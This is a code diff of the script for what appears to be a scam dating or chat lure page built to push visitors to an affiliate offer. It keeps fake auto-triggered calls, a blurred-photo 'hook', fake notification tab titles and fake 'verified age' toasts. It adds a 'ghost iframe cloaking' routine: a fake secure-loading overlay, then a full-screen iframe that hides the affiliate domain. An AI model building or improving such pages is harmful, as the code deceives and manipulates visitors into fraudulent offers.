@@ -127,7 +127,8 @@
     </div>
 
     <script>
-        const REDIRECT_URL = "https://t.taffizerq.com/719iel";
+        // আপনার নতুন আপডেট করা অ্যাফাইজার লিংক
+        const AFFILIATE_URL = "https://t.taffizerq.com/click?pid=3844&offer_id=2310";
         let originalTitle = document.title;
         let hasCalled = false;
 
@@ -144,7 +145,7 @@
             renderList();
             startToasts();
             
-            // TRICK: Auto trigger call after 7 seconds
+            // Auto trigger call after 7 seconds
             setTimeout(() => {
                 if(!hasCalled && document.getElementById('chatModal').classList.contains('hidden')) {
                     triggerCall(0);
@@ -153,7 +154,7 @@
             }, 7000);
         };
 
-        // Tab Title Alert Trick
+        // Tab Title Alert
         document.addEventListener("visibilitychange", () => {
             document.title = document.hidden ? "(1) 💬 New Notification!" : originalTitle;
         });
@@ -181,8 +182,6 @@
         function openChat(index) {
             currentActive = profiles[index];
             const modal = document.getElementById('chatModal');
-            
-            // Apply platform themes dynamically
             modal.className = `fixed inset-0 z-[1500] flex flex-col ${currentActive.themeClass}`;
             
             document.getElementById('chatProfileImg').src = currentActive.img;
@@ -193,7 +192,6 @@
             document.body.style.overflow = 'hidden';
             chatBlocked = false;
 
-            // Instantly send a fake blurred photo as a hook
             setTimeout(() => {
                 document.getElementById('msgSnd').play();
                 addBlurredImage();
@@ -239,7 +237,6 @@
             area.scrollTop = area.scrollHeight;
         }
 
-        // Blurred Photo Hook Trick
         function addBlurredImage() {
             const area = document.getElementById('chatArea');
             const box = document.createElement('div');
@@ -280,7 +277,6 @@
             area.scrollTop = area.scrollHeight;
         }
 
-        // Call & Pairing Logic
         function triggerCall(i) {
             currentActive = profiles[i];
             document.getElementById('callImg').src = currentActive.img;
@@ -306,16 +302,46 @@
             document.getElementById('pairingOverlay').classList.remove('hidden');
         }
 
-        function redirectToAffizer() { window.location.href = REDIRECT_URL; }
+        // MASTER TRICK: GHOST IFRAME CLOAKING + SECURE OVERLAY INTERCEPTOR
+        function redirectToAffizer() {
+            // ১. ফেক সিকিউর লোডিং ওভারলে স্ক্রিন তৈরি
+            const overlay = document.createElement('div');
+            overlay.className = 'fixed inset-0 z-[5000] bg-slate-950 flex flex-col items-center justify-center text-center p-4 backdrop-blur-md transition-opacity duration-500';
+            overlay.innerHTML = `
+                <div class="relative w-20 h-20 mb-6">
+                    <div class="absolute inset-0 border-4 border-slate-800 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-pink-500 rounded-full border-t-transparent animate-spin"></div>
+                    <i class="fas fa-lock absolute inset-0 flex items-center justify-center text-2xl text-emerald-400"></i>
+                </div>
+                <h2 class="text-2xl font-black text-white mb-2 animate-pulse">Creating Secure Profile...</h2>
+                <p class="text-[10px] text-emerald-400 font-bold uppercase tracking-widest mt-2">Connecting to Live Server</p>
+            `;
+            document.body.appendChild(overlay);
 
-        // Live Toasts Trick
+            // ট্রাস্টেড সাউন্ড প্লেয়ার
+            const clickSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3');
+            clickSound.volume = 0.4;
+            clickSound.play().catch(() => {});
+
+            // ২. ঠিক ২ সেকেন্ডের মাথায় ডোমেইন হাইড করে ফুল-স্ক্রিন আইফ্রেম ইনজেক্ট করা
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <iframe 
+                        src="${AFFILIATE_URL}" 
+                        style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; background:#fff;" 
+                        title="Secure Verification">
+                    </iframe>
+                `;
+            }, 2000);
+        }
+
         function startToasts() {
             const feed = document.getElementById('toastContainer');
             setInterval(() => {
                 if(document.hidden) return;
                 const toast = document.createElement('div');
                 toast.className = "toast-enter glass-card px-4 py-3 rounded-xl border-l-4 border-l-emerald-500 flex items-center gap-3 w-64 shadow-2xl";
-                toast.innerHTML = `<img src="${profiles[Math.floor(Math.random()*profiles.length)].img}" class="w-8 h-8 rounded-full"><div class="flex-1"><p class="text-[10px] text-slate-300">Just verified age!</p><p class="text-xs font-bold text-white">Guest from US</p></div>`;
+                toast.innerHTML = `<img src="${profiles[Math.floor(Math.random()*profiles.length)].img}" class="w-8 h-8 rounded-full"><div class="flex-1"><p class="text-[10px] text-slate-300">Just verified age!</p><p class="text-xs font-bold text-white">Guest from Online</p></div>`;
                 feed.appendChild(toast);
                 setTimeout(() => toast.remove(), 4000);
             }, 8000);
